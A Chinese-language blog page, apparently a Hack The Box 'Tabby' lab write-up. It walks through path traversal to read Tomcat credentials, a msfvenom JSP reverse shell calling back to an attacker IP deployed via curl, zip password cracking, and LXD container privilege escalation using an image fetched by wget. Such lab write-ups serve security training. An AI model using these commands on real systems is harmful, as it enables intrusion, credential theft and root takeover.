@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="端口扫描1nmap -sC -sV -T5 10.10.10.194 -oN nmap.txt  站点文件包含12#添加主机解析echo &quot;10.10.10.194 megahosting.htb&quot;&gt;&gt;&#x2F;etc&#x2F;hosts 发现存在文件包含漏洞 1http:&#x2F;&#x2F;megahosting.htb&#x2F;news.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  文件上传对10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-tabby">
+<meta property="og:url" content="http://yoursite.com/2020/08/24/HTB-tabby/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="端口扫描1nmap -sC -sV -T5 10.10.10.194 -oN nmap.txt  站点文件包含12#添加主机解析echo &quot;10.10.10.194 megahosting.htb&quot;&gt;&gt;&#x2F;etc&#x2F;hosts 发现存在文件包含漏洞 1http:&#x2F;&#x2F;megahosting.htb&#x2F;news.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd  文件上传对10.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200823210641296.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200823210856625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200823212242638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200823212300662.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200823212517765.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200823212529785.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200824112834828.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200824114726279.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200824115913845.png#pic_center">
+<meta property="article:published_time" content="2020-08-24T06:31:36.103Z">
+<meta property="article:modified_time" content="2020-08-24T06:31:47.631Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200823210641296.png#pic_center">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HTB-tabby</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/08/21/Windows--Wmic_Get-CimInstance/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/24/HTB-tabby/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/24/HTB-tabby/&text=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/24/HTB-tabby/&is_video=false&description=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-tabby&body=Check out this article: http://yoursite.com/2020/08/24/HTB-tabby/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/24/HTB-tabby/&name=HTB-tabby&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/08/24/HTB-tabby/&t=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#端口扫描"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#站点文件包含"><span class="toc-number">2.</span> <span class="toc-text">站点文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传"><span class="toc-number">3.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell生成"><span class="toc-number">3.1.</span> <span class="toc-text">shell生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传shell"><span class="toc-number">3.2.</span> <span class="toc-text">上传shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#侦听4444端口，获得shell"><span class="toc-number">3.3.</span> <span class="toc-text">侦听4444端口，获得shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件爆破"><span class="toc-number">4.</span> <span class="toc-text">文件爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LXD提权"><span class="toc-number">5.1.</span> <span class="toc-text">LXD提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他"><span class="toc-number">6.</span> <span class="toc-text">其他</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB-tabby
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-24T06:31:36.103Z" itemprop="datePublished">2020-08-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -T5 10.10.10.194 -oN nmap.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200823210641296.png#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="站点文件包含"><a href="#站点文件包含" class="headerlink" title="站点文件包含"></a>站点文件包含</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加主机解析</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"10.10.10.194 megahosting.htb"</span>&gt;&gt;/etc/hosts</span><br></pre></td></tr></table></figure>
+<p>发现存在文件包含漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://megahosting.htb/news.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200823210856625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>对10.10.10.194:8080进行wfuzz</p>
+<p><img src="https://img-blog.csdnimg.cn/20200823212242638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>XXX/tomcat-users.xml的文件会存在 账户密码<br><img src="https://img-blog.csdnimg.cn/20200823212300662.png#pic_center" alt="在这里插入图片描述"><br>故</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u  <span class="string">"http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml"</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hh 0</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200823212517765.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200823212529785.png#pic_center" alt="在这里插入图片描述"><br>由tomcat-users.xmltomcat文件可知tomcat只有admin-gui,manager-script两个角色<br>没有manager-gui角色<br>故无法登陆<a href="http://10.10.10.194/manager/html" target="_blank" rel="noopener">http://10.10.10.194/manager/html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">manager-gui — Access to the HTML interface.</span><br><span class="line">manager-status — Access to the <span class="string">"Server Status"</span> page only.</span><br><span class="line">manager-script — Access to the tools-friendly plain text interface that is described <span class="keyword">in</span> this document, and to the <span class="string">"Server Status"</span> page.</span><br><span class="line">manager-jmx — Access to JMX proxy interface and to the <span class="string">"Server Status"</span> page.</span><br><span class="line"></span><br><span class="line">admin-gui - use this role <span class="keyword">for</span> the graphical web interface.</span><br><span class="line">admin-script - use this role <span class="keyword">for</span> the scripting web interface.</span><br></pre></td></tr></table></figure>
+<p>使用<a href="https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/" target="_blank" rel="noopener">host-manager</a>添加虚拟主机失败 [但是tomcat又存在admin-gui角色，或许可以部署成功….]</p>
+<p>发现存在manager-script角色，可使用<a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script" target="_blank" rel="noopener">curl命令上传文件</a>部署shell</p>
+<ul>
+<li>为什么部署在<a href="http://localhost:8080/manager/text/deploy?path=下？" target="_blank" rel="noopener">http://localhost:8080/manager/text/deploy?path=下？</a><br>由官方文档可知 <img src="https://img-blog.csdnimg.cn/20200824112834828.png#pic_center" alt="在这里插入图片描述"><h2 id="shell生成"><a href="#shell生成" class="headerlink" title="shell生成"></a>shell生成</h2></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#msfvenom -l payloads |grep reverse_tcp #查看某一payload</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.51 lport=4444 -f war &gt; get.war</span><br></pre></td></tr></table></figure>
+<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -f -T get.war -u <span class="string">'tomcat:$3cureP4s5w0rd123!'</span> <span class="string">"http://10.10.10.194:8080/manager/text/deploy?path=/get.war"</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看shell上传是否成功</span></span><br><span class="line">http://10.10.10.194:8080/manager/text/list</span><br></pre></td></tr></table></figure>
+<h2 id="侦听4444端口，获得shell"><a href="#侦听4444端口，获得shell" class="headerlink" title="侦听4444端口，获得shell"></a>侦听4444端口，获得shell</h2><p><img src="https://img-blog.csdnimg.cn/20200824114726279.png#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="文件爆破"><a href="#文件爆破" class="headerlink" title="文件爆破"></a>文件爆破</h1><p><img src="https://img-blog.csdnimg.cn/20200824115913845.png#pic_center" alt="在这里插入图片描述"><br>文件下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.194/files/16162020_backup.zip</span><br></pre></td></tr></table></figure>
+<p>文件爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</span><br></pre></td></tr></table></figure>
+<p>获得ash密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/home$ su ash</span><br><span class="line">su ash</span><br><span class="line">Password: admin@it</span><br><span class="line">ash@tabby:/home$ whoami</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>脚本枚举</p>
+<h2 id="LXD提权"><a href="#LXD提权" class="headerlink" title="LXD提权"></a>LXD提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击机</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line"><span class="comment">#目标机</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br><span class="line"><span class="comment">#创建容器，并指定别名 myimage</span></span><br><span class="line">lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">lxc image list</span><br><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="comment">#挂载 /mnt/root </span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span class="built_in">cd</span> /mnt/root/root</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.freebuf.com/articles/system/216803.html" target="_blank" rel="noopener">参考链接</a></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
+<li>若存在admin-script角色，使用命令部署</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Example command:</span></span><br><span class="line">curl -u <span class="built_in">test</span>:<span class="built_in">test</span> http://localhost:8080/host-manager/text/add?name=www.awesomeserver.com&amp;aliases=awesomeserver.com&amp;appBase/mnt/appDir&amp;deployOnStartup=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>多阅读官方文档</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#端口扫描"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#站点文件包含"><span class="toc-number">2.</span> <span class="toc-text">站点文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传"><span class="toc-number">3.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell生成"><span class="toc-number">3.1.</span> <span class="toc-text">shell生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传shell"><span class="toc-number">3.2.</span> <span class="toc-text">上传shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#侦听4444端口，获得shell"><span class="toc-number">3.3.</span> <span class="toc-text">侦听4444端口，获得shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件爆破"><span class="toc-number">4.</span> <span class="toc-text">文件爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LXD提权"><span class="toc-number">5.1.</span> <span class="toc-text">LXD提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他"><span class="toc-number">6.</span> <span class="toc-text">其他</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/24/HTB-tabby/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/24/HTB-tabby/&text=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/24/HTB-tabby/&is_video=false&description=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-tabby&body=Check out this article: http://yoursite.com/2020/08/24/HTB-tabby/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/24/HTB-tabby/&title=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/24/HTB-tabby/&name=HTB-tabby&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/08/24/HTB-tabby/&t=HTB-tabby" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2020
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
